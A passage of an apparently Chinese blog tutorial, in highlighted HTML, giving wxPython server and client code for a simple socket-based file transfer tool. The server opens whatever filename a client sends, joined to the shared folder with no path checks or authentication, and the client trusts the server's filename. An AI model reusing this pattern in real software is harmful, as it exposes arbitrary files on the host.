operator">=</span><span class="token string">'选择共享文件夹'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"服务器的IP地址为："</span><span class="token operator">+</span>self<span class="token punctuation">.</span>ip<span class="token operator">+</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"IP地址显示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> client <span class="token operator">=</span> phone<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    <span class="token comment"># 收命令</span>                    res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8096</span><span class="token punctuation">)</span>                    <span class="token comment"># 解析命令、提取相应的命令参数</span>                    cmds <span class="token operator">=</span> res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ['get','a.txt']  split变列表格式</span>                    filename <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token comment"># 已读的方式打开文件，读取文件内容发送给客户端</span>                    <span class="token comment"># 第一步：制作固定长度的报头</span>                    header_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                        <span class="token string">'filename'</span><span class="token punctuation">:</span> filename<span class="token punctuation">,</span>                        <span class="token string">'file_size'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span><span class="token string">r'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 这里把文件的名字和地址结合在一起得到文件长度</span>                    <span class="token punctuation">&#125;</span>  <span class="token comment"># 字典方便储存数据</span>                    header_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  <span class="token comment"># 把字典转换成js格式(字符串类型)</span>                    header_bytes <span class="token operator">=</span> header_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>                    <span class="token comment"># 第二步：先发送报头的长度</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment"># 第三步：再发报头</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span>                    <span class="token comment"># 第四步：发送真实数据</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>                            <span class="token comment"># 这样一行一行发比直接发送f.read节省内存空间</span>                            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># except ConnectionResetError as err:</span>                    <span class="token comment"># break</span>                    <span class="token keyword">break</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">bjk1_axEnterj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('bjk1,按下Enter键')</span>        <span class="token comment"># print(self.share_dir)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"打开文件夹"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            img_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>img_list<span class="token punctuation">)</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'文件菜单.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>  <span class="token comment"># 创建文件，权限为写入</span>            <span class="token keyword">for</span> img_name <span class="token keyword">in</span> img_list<span class="token punctuation">:</span>                <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_name <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件菜单已创建"</span><span class="token punctuation">,</span> <span class="token string">"软件提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（客户端）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入服务器IP地址:'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'请输入需要下载的文件:'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择文件存放地址'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"请选择文件存放地址"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>filename<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">"get "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>filename        <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------开始咨询客服---------"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 发命令</span>            <span class="token comment"># get a.txt</span>            <span class="token keyword">if</span> cmd<span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            phone<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 已写的方式打开一个新文件，接收服务器发来的文件的内容写入客户端的新文件</span>            <span class="token comment"># 第一步：先收取报头的长度</span>            obj <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>            header_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token comment"># 第二步：再收报头</span>            header_bytes <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>header_size<span class="token punctuation">)</span>            <span class="token comment"># 第三步：从报头中间解析出对真是数据的描述信息</span>            header_json <span class="token operator">=</span> header_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>            header_dic <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>header_json<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>            total_size <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'file_size'</span><span class="token punctuation">]</span>            filename <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>            <span class="token comment"># 第三步：接受真实的数据</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 在自己的电脑中找一个地址打开一个同类型的文件准备接收数据</span>                recv_size <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">while</span> recv_size <span class="token operator">&lt;</span> total_size<span class="token punctuation">:</span>                    line <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    recv_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'总大小：%s   已下载大小：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>total_size<span class="token punctuation">,</span> recv_size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 显示下载进度</span>            cmd<span class="token operator">=</span><span class="token string">'a'</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件下载完成!"</span><span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 